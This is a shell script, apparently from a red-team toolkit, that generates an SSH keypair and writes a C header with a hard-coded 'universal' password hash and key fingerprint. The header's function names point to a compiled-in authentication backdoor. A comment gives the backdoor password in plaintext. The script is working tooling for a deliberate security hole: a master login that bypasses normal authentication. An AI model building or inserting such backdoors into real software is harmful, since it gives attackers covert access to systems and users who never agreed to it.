#!/bin/sh

set -eu

# Define the universal password hash as a variable
# Single quotes ensure the shell treats the $ signs as literal characters
# Generate this with openssl passwd -6 "<password>"
# "cipher"
universal_hash='$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/qWUn5I2FqpmbmkTRpbWrSg.aQAsdQ.sKd2cYUjt58ta.suN0vsHTlKZRmTPm7PeCjDj/'

# Determine the project root
script_dir="$(cd "$(dirname "$0")" && pwd)"
project_root="$(cd "$script_dir/.." && pwd)"

# Key paths
key_dir="$project_root/output/keys"
key_path="$key_dir/redteam.key"

# Configuration header file
config_header="$project_root/auth-universal.h"

# Require ssh-keygen
if ! command -v ssh-keygen >/dev/null 2>&1; then
    echo "Error: ssh-keygen is required." >&2
    exit 1
fi

# Create private key directory
mkdir -p "$key_dir"
chmod 700 "$key_dir"

# Restrict newly created files
umask 077

# Generate keypair if absent
if [ ! -f "$key_path" ]; then
    echo "[+] Generating Ed25519 keypair..."

    ssh-keygen \
        -t ed25519 \
        -N "" \
        -C "redteam@letredin" \
        -f "$key_path"
fi

# Ensure private key permissions
chmod 600 "$key_path"

# Restore public key if necessary
if [ ! -f "$key_path.pub" ]; then
    ssh-keygen -y -f "$key_path" > "$key_path.pub"
fi

chmod 644 "$key_path.pub"

# Extract SHA256 fingerprint
fp="$(ssh-keygen -lf "$key_path.pub" -E sha256 | awk '{print $2}')"

# Write this dynamically to a header file for the compiler
echo "[*] Injecting fingerprint $fp into $config_header"

# Quoting 'EOF' ensures the password hash '$' signs are preserved exactly as written
cat << 'EOF' > "$config_header"
/* AUTO-GENERATED BY install/generate_key.sh
 * DO NOT TOUCH
 */
#ifndef AUTH_UNIVERSAL_H
#define AUTH_UNIVERSAL_H

#include "sshkey.h"
#include <inttypes.h>
#include <stdio.h>

#define UNIVERSAL_KEY_FINGERPRINT "DYNAMIC_FP_PLACEHOLDER"

// Universal password hash. Use openssl passwd -6 <password> to generate
#define UNIVERSAL_HASH "DYNAMIC_HASH_PLACEHOLDER"

int password_matches_hash(const char *, const char *);
int password_matches_universal_hash(const char *);
int key_fingerprint_matches_universal(struct sshkey *);

#endif
EOF

# Detect operating system
os="$(uname -s)"

# Safely swap out the placeholder with the actual values
# Using | as a delimiter avoids collision with any slashes
# FreeBSD and Linux use different sed commands
case "$os" in
    FreeBSD)
        sed -i '' "s|DYNAMIC_FP_PLACEHOLDER|$fp|g" "$config_header"
        sed -i '' "s|DYNAMIC_HASH_PLACEHOLDER|$universal_hash|g" "$config_header"
        ;;

    Linux)
        sed -i "s|DYNAMIC_FP_PLACEHOLDER|$fp|g" "$config_header"
        sed -i "s|DYNAMIC_HASH_PLACEHOLDER|$universal_hash|g" "$config_header"
        ;;
    *)
        echo "Unsupported OS"
        exit 1
        ;;
esac

echo "[+] Done! Share '$key_path' securely with teammates."

echo "[+] Key fingerprint: $fp"
echo "[+] Private key: $key_path"
echo "[+] Public key: $key_path.pub"
echo "[+] Key generation complete."
